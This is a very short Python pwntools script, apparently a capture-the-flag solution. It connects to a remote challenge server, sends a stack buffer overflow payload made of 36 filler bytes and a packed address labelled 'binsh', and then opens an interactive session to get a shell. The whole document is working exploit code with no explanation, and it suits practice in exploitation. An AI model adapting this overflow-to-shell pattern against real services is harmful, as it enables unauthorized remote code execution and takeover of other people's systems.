from pwn import *

r=remote("bamboofox.cs.nctu.edu.tw",11002)

binsh=0x804a02c

payload=36*"a"+p32(binsh)

r.sendline(payload)

r.interactive()
